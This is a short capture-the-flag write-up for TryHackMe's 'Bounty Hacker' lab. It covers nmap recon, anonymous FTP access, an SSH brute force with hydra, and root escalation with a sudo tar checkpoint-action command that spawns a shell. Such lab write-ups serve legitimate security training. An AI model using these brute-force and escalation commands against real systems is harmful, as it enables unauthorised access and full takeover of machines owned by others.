# TryHackMe — Bounty Hacker Writeup

**Category:** TryHackMe  
**Difficulty:** Easy  

---

## Recon

```bash
nmap -p21,22,80 -Pn -sV TARGET_IP
```

- Port 21: FTP
- Port 22: SSH
- Port 80: HTTP

---

## FTP Anonymous Login

```bash
ftp TARGET_IP
# username: anonymous
# password: (blank)
ls -la
mget *
```

Two files downloaded:
- `locks.txt` — password wordlist
- `task.txt` — note signed by user `lin`

---

## SSH Brute Force

```bash
hydra -l lin -P locks.txt TARGET_IP ssh
```

Valid credentials found → `lin:<password>`

---

## User Flag

```bash
ssh lin@TARGET_IP
cat /home/lin/Desktop/user.txt
```

---

## Privilege Escalation

```bash
sudo -l
# lin can run /bin/tar as root
```

Exploit via GTFOBins:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Summary

| Field | Value |
|-------|-------|
| Initial access | FTP anonymous login → credentials in files |
| Lateral movement | SSH brute force with Hydra |
| Privilege escalation | sudo tar GTFOBins exploit |

